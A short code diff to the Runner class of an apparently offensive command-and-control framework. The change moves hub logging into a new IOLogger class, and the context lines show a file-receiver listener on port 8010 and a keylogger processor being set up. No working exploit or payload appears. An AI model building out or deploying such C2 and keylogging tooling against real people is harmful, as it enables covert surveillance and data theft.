@@ -21,6 +21,7 @@ import c2.session.CommandLoader;
 import c2.session.CommandMacroManager;
 import c2.session.IOManager;
 import c2.session.SessionManager;
+import c2.session.log.IOLogger;
 import c2.tcp.filereceiver.FileReceiverSessionReceiver;
 
 public class Runner {
@@ -136,7 +137,8 @@ public class Runner {
 		FileReceiverSessionReceiver receiver = new FileReceiverSessionReceiver(8010, Paths.get("test", "fileReceiverTest"));
 		service.execute(receiver);
 		
-		ioManager = new IOManager(Paths.get(properties.getProperty(Constants.HUBLOGGINGPATH)), cl);
+		IOLogger logger = new IOLogger(Paths.get(properties.getProperty(Constants.HUBLOGGINGPATH)));
+		ioManager = new IOManager(logger, cl);
 
 		keylogger = new KeyloggerProcessor();
 		keylogger.initialize(properties.getProperty(Constants.DAEMONLZLOGGER));
